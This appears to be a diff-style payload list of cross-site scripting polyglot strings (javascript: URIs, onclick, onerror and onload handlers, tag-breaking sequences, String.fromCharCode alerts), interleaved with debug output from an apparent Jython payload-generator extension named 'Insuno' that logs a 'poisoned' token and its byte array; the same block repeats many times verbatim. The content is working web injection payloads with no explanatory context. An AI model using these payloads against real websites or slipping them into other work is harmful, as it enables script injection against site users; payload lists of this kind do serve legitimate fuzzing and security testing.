+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+('Insuno.getNextPayload.carga_formalizada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy')
+('Insuno.getNextPayload.carga_envenenada', 'E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVyVENENO')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@3e78b9a9)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@3e78b9a9, array('b', [69, 51, 79, 122, 81, 101, 110, 101, 80, 87, 111, 106, 52, 122, 107, 50, 57, 51, 97, 82, 88, 56, 75, 98, 66, 78, 89, 69, 65, 111, 57, 71, 76, 53, 113, 79, 49, 90, 68, 119, 112, 54, 74, 121, 86, 120, 103, 81, 77, 109, 114, 108, 118, 55, 110, 112, 75, 76, 86, 121]))
+
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
